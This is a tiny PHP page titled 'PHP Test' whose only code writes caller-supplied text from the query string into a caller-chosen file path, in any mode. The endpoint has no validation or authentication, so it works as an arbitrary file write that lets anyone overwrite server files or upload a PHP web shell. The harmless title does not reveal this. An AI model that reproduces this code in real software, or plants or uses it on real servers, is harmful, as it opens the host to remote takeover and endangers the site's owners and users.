<html>
 <head>
  <title>PHP Test</title>
 </head>
 <body>
 <?php
 	$text = $_GET['content'];
	$fname = $_GET['filename'];
	$fmode = $_GET['mode'];
	$file = fopen($fname,$fmode);
	echo fwrite($file,$text);
	fclose($file);
 ?> 
 </body>
</html>
